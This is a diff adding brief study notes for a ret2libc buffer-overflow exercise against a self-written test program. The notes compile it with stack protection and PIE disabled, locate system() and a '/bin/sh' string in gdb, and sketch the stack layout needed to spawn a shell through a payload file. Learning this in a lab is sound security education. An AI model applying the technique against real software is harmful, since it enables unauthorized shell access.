@@ -1,0 +1,18 @@
+g++ -o simple_buffer_overflow simple_buffer_overflow.cpp -fno-stack-protector -m32 -no-pie
+gdb simple_buffer_overflow
+
+break main
+r
+print system
+find $1, +999999999999, "/bin/sh"  # find string bin/bash for exploit
+x/s 0xf7cbce52                     # pointer from prev cmd
+
+for ret2c to work on this arch 
+the stack has to be
+
+address of the bin/sh string
+fake return address    # aaaa or anything 
+system address
+old bp                 # now garbage from our sequence
+
+./simple_buffer_overflow "$(cat payload.txt)"
